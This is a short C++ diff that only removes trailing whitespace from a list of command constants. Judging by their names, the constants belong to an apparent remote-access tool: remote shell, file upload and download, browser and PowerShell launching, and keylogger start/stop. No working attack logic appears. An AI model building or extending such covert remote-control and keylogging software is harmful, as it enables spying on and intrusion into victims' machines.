@@ -9,22 +9,22 @@
 #include <vector>
 #include <fstream>
 
-constexpr UINT CMD_FULLSCREEN        = 101;           
-constexpr UINT CMD_START_EXPLORER    = WM_USER + 1;    
-constexpr UINT CMD_START_RUN         = WM_USER + 2;       
-constexpr UINT CMD_START_CHROME      = WM_USER + 3;    
-constexpr UINT CMD_START_EDGE        = WM_USER + 4;        
-constexpr UINT CMD_START_BRAVE       = WM_USER + 5;    
-constexpr UINT CMD_START_FIREFOX     = WM_USER + 6;    
-constexpr UINT CMD_START_IEXPL       = WM_USER + 7;    
-constexpr UINT CMD_START_POWERSHELL  = WM_USER + 8;    
-constexpr UINT CMD_SHELL_OPEN        = 300;           
-constexpr UINT CMD_SHELL_COMMAND     = 301;            
-constexpr UINT CMD_FILE_LIST         = 310;            
-constexpr UINT CMD_FILE_DOWNLOAD     = 311;            
-constexpr UINT CMD_FILE_UPLOAD       = 312;            
-constexpr UINT CMD_KEYLOGGER_START   = 320;            
-constexpr UINT CMD_KEYLOGGER_STOP    = 321;           
+constexpr UINT CMD_FULLSCREEN        = 101;
+constexpr UINT CMD_START_EXPLORER    = WM_USER + 1;
+constexpr UINT CMD_START_RUN         = WM_USER + 2;
+constexpr UINT CMD_START_CHROME      = WM_USER + 3;
+constexpr UINT CMD_START_EDGE        = WM_USER + 4;
+constexpr UINT CMD_START_BRAVE       = WM_USER + 5;
+constexpr UINT CMD_START_FIREFOX     = WM_USER + 6;
+constexpr UINT CMD_START_IEXPL       = WM_USER + 7;
+constexpr UINT CMD_START_POWERSHELL  = WM_USER + 8;
+constexpr UINT CMD_SHELL_OPEN        = 300;
+constexpr UINT CMD_SHELL_COMMAND     = 301;
+constexpr UINT CMD_FILE_LIST         = 310;
+constexpr UINT CMD_FILE_DOWNLOAD     = 311;
+constexpr UINT CMD_FILE_UPLOAD       = 312;
+constexpr UINT CMD_KEYLOGGER_START   = 320;
+constexpr UINT CMD_KEYLOGGER_STOP    = 321;
 
 static HANDLE g_hShellProcess    = NULL;
 static HANDLE g_hShellThread     = NULL;
